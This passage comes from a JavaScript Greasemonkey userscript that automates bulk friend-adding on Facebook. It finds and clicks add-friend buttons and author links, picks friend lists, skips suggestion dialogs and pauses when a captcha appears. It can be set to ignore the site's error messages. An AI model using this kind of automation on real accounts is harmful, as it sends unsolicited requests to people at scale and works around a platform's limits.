	for(var s=0; s<popDialogss.snapshotLength; s++) {
		var pop_content=popDialogss.snapshotItem(s);

		var ss=document.evaluate("//a[contains(@class,'UIActionButton')]",pop_content,null,XPathResult.ORDERED_NODE_SNAPSHOT_TYPE,null);
		return ss;
	}
	return null;
},
FindNthAddAsFriend:function(nth) {
	var ss=this.FindNthAddAsFriends();
	
	if(ss && nth<ss.snapshotLength) {
		return ss.snapshotItem(nth);
	}

	return null;
},

FindNthPost:function(nth) {
	var content=document.getElementById('content');
	if(location.href.indexOf('.facebook.com')<0) {
		content=document.body;
	}
	if(!content) return;
	var as=content.getElementsByTagName('a');
	var upto=0;
	for(var aUpto=0; aUpto<as.length; aUpto++) {
		var a=as[aUpto];
		var addFriendDialog=this.HasAddFriendDialog(a);

		if(!addFriendDialog && a.href.indexOf('k=')<0) { 
			// this person is already our friend.
			continue; 
		}

		// author_post: used in discussions
		// profile_link: used in reviews
		if(!addFriendDialog && a.className!="author_post" && a.className!="profile_link") {
			continue; 
		}
		if(a.parentNode.className.indexOf("fb_menu")>=0 || a.innerHTML.indexOf('<img')>=0) {
			continue;
		}
		var pn=a;
		var presence=false;
		while(pn && pn.tagName!="BODY") {
			if(pn.id=="presence") {
				presence=true;
			}
			pn=pn.parentNode;
		}
		if(presence) { continue; }
		if(nth==upto++) { return a; }
	}
	return null;
},


ClickFriendListDropDown:function(div) {
	GM_log('ClickFriendListDropDown');
	//var friendAdd=nHtml.FindByAttr(div,'span','class','FriendAddingTool_Menu');
	var friendAdd=nHtml.FindByXPath(div,".//a[contains(@class,'uiSelectorButton')]");
	if(friendAdd) {
			nHtml.ClickUp(friendAdd);
	/*
		var friendAddDropDown=nHtml.FindByAttr(friendAdd,'span','class','UIActionMenu_Text');

		// show the drop down for friends' lists
		if(friendAddDropDown) {
			nHtml.ClickUp(friendAddDropDown);
		} else {
			GM_log('cannot find friend list drop down');
		}
		*/
	} else {
		GM_log('cannot find the friends list drop down');
	}
},
GetFriendListDropDown:function(div) {
	if(!div) { GM_log('GetFriendListDropDown: no div'); }
	//return nHtml.FindByAttr(div,'div','class','FriendAddingTool_InnerMenu');
	var dropDown=nHtml.FindByXPath(div,".//a[contains(@class,'uiSelectorButton') and contains(@class,'selected')]");
	if(dropDown) {
		dropDown=dropDown.parentNode;
	}
	return dropDown;
},
SelectFriendListDropDown:function(friendAddSelect,friendList) {
	GM_log('SelectFriendListDropDown');
	if(!friendAddSelect) { GM_log('Bad!, no friendAddSelect'); }
	var friendListItem=nHtml.FindByXPath(friendAddSelect,".//li[string()='"+friendList+"']");
	if(friendListItem) {
			nHtml.ClickUp(friendListItem);
			GM_log('click friend list item:'+friendListItem.innerHTML);
	} else {
		GM_log('Cannot find friend List item:'+friendList);
	}
},

SkipButton:function() {
	// skip reported suggest a friend dialogs from facebook.
	var skip=document.getElementById('skip');
	if(skip && skip.tagName=="INPUT") { 
		GM_log('Clicking skip button');
		nHtml.Click(skip);
		return true;
	}
	return false;
},

SetWaitForAddMe:function(v) {
	this.waitForAddMe=v;
	this.waitForAddMeStarted=(new Date()).getTime();	
},

CloseIFrameOnCompletion:function() {
	if(window.name=="" || !unsafeWindow.parent) return;
	var t=this;
	try {
		window.setTimeout(function() {
			t.FindCaptcha();
			if(!t.hasCaptcha) {
				if(unsafeWindow.parent && unsafeWindow.parent.CloseIFrameByName) {
					GM_log('closing iframe:'+window.name);
					unsafeWindow.parent.CloseIFrameByName(window.name);
				}
			} else {
				GM_log('Has captcha do not close iframe:'+window.location.href);
			}
			t.CloseIFrameOnCompletion();
		},5000);
	} catch(e) {
		GM_log('close iframe problem:'+e);
	}
},

FindCaptcha:function() {
	var captcha=document.getElementById('captcha_session');
	this.hasCaptcha=captcha?true:false;
	return captcha;
},

hasCaptcha:false,
BulkAddMe:function(startTime) {
	var waitMillis=250;
	var error=document.getElementById('error');
	if(error && !this.bulkAddOptions.ignoreErrors) {
		var visible=true;
		while(error.tagName!="BODY") {
			if(error.style.display=="none") {
				visible=false;
				break;
			}
			error=error.parentNode;
		}
		if(visible) {
			GM_log('Error found, bulk add aborted');
			//if(GM_getValue('autoBulkAdd_RemoveWhenFinished',false))
			if(this.autoBulkAdd_RemoveWhenFinished && !this.profilePageAdd)
				this.SetAutoBulkAdd(false);
			return;
		}
	}

	this.ClickClose();

//	DebugLog(this.waitForAddMe+","+this.addMeUpto);
	var captcha=this.FindCaptcha();
	var cp=captcha;
	